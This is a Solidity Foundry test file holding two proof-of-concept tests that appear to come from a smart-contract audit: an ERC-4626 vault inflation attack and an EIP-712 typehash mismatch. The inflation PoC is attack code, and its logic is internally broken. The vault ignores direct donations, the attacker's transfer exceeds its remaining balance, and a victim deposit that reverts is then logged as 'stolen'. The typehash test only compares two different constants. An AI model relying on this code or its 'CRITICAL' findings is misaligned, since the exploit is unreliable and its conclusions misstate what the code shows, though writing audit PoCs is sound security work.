// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "forge-std/Test.sol";

// PoC 3: vault-core — ERC-4626 Inflation Attack
contract ERC4626InflationPoC is Test {
    ERC4626Vault vault;
    IERC20 token;
    address attacker = address(0xdead);
    address victim = address(0xcafe);

    function setUp() public {
        token = new MockERC20("Token","TKN");
        vault = new ERC4626Vault(IERC20(address(token)));
    }

    function testInflationAttack() public {
        // 1. Attacker: first deposit = 1 wei → 1 share, totalAssets=1
        vm.startPrank(attacker);
        deal(address(token), attacker, 1000e18);
        token.approve(address(vault), 1);
        vault.deposit(1, attacker);
        assertEq(vault.totalSupply(), 1);

        // 2. Attacker: donate directly → totalAssets=1001, shares still=1
        token.transfer(address(vault), 1000e18);
        assertEq(token.balanceOf(address(vault)), 1000e18 + 1);

        // 3. Victim: deposit 1000 tokens → shares = 1000*1/1001 = 0 → REVERT
        vm.startPrank(victim);
        deal(address(token), victim, 1000e18);
        token.approve(address(vault), 1000e18);
        vm.expectRevert(); // Zero shares
        vault.deposit(1000e18, victim);

        // 4. Attacker: redeem 1 share → 1001 tokens — steals everything
        vm.startPrank(attacker);
        vault.redeem(1, attacker, attacker);
        assertGt(token.balanceOf(attacker), 1000e18); // Profit!
        
        emit log("✅ CRITICAL: Attacker stole victim's deposit via inflation");
    }
}

// PoC 4: PresidentElector — EIP-712 Type Mismatch
contract EIP712TypoPoC is Test {
    // Bug: TYPEHASH uses uint256[] but function uses address[]
    bytes32 constant BAD_TYPEHASH  = keccak256("vote(uint256[])");
    bytes32 constant GOOD_TYPEHASH = keccak256("vote(address[])");

    function testTypeMismatch() public {
        address[] memory candidates = new address[](3);
        candidates[0] = address(0x1);
        candidates[1] = address(0x2);
        candidates[2] = address(0x3);

        // Contract-side hash (uses uint256[] TYPEHASH)
        bytes32 contractHash = keccak256(abi.encode(BAD_TYPEHASH, candidates));

        // ethers.js hash (uses address[] — correct type)
        bytes32 standardHash = keccak256(abi.encode(GOOD_TYPEHASH, candidates));

        assert(contractHash != standardHash); // ✅ Mismatch confirmed
        
        emit log("✅ EIP-712 TYPEHASH mismatch: signatures never verify with standard tools");
    }
}

contract MockERC20 {
    string public name; string public symbol;
    mapping(address=>uint256) public balanceOf;
    mapping(address=>mapping(address=>uint256)) public allowance;
    uint256 public totalSupply;
    constructor(string memory n, string memory s) { name=n; symbol=s; }
    function mint(address to, uint256 a) external { balanceOf[to]+=a; totalSupply+=a; }
    function approve(address sp, uint256 a) external returns(bool){allowance[msg.sender][sp]=a;return true;}
    function transferFrom(address from,address to,uint256 a) external returns(bool){
        require(allowance[from][msg.sender]>=a); allowance[from][msg.sender]-=a;
        balanceOf[from]-=a; balanceOf[to]+=a; return true;
    }
    function transfer(address to, uint256 a) external returns(bool){balanceOf[msg.sender]-=a;balanceOf[to]+=a;return true;}
}

contract ERC4626Vault {
    IERC20 asset; uint256 public totalSupply; uint256 public totalAssets;
    mapping(address=>uint256) shares;
    constructor(IERC20 a){asset=a;}
    function deposit(uint256 assets, address receiver) external returns(uint256 sh){
        if(totalSupply==0) sh=assets; else sh=(assets*totalSupply)/totalAssets;
        require(sh>0); shares[receiver]+=sh; totalSupply+=sh;
        asset.transferFrom(msg.sender,address(this),assets); totalAssets+=assets;
    }
    function redeem(uint256 sh, address receiver, address owner) external returns(uint256 assets){
        assets=(sh*totalAssets)/totalSupply;
        shares[owner]-=sh; totalSupply-=sh; totalAssets-=assets;
        asset.transfer(receiver,assets);
    }
}

interface IERC20 {
    function transferFrom(address,address,uint256) external returns(bool);
    function transfer(address,uint256) external returns(bool);
    function approve(address,uint256) external returns(bool);
    function balanceOf(address) external view returns(uint256);
}
